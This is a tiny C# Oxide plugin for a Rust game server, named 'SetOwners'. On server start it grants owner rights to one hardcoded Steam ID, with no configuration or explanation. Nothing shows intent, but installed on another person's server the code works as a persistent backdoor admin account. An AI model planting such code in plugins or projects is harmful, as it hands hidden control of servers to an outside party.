using System;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using Rust;

namespace Oxide.Plugins
{
    [Info("SetOwners", "Nimant", "1.0.0")]
    public class SetOwners: RustPlugin
    {
		private void OnServerInitialized() 
		{
			rust.RunServerCommand("ownerid 76561199221225473");
		}
		        
    }
}	